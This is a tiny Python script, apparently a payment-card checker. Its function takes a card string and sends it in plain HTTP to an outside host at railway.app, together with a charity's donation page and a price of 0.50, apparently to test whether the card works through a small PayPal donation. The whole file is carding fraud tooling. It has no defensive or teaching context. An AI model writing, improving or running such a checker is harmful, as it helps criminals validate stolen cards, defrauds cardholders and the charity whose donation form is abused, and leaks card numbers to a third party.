import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://donatebear.com/donations/empower-the-kids-of-ghana-by-volunteering-causes/"
	price="0.50"
	res=requests.get(f'http://kai543.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
	return res
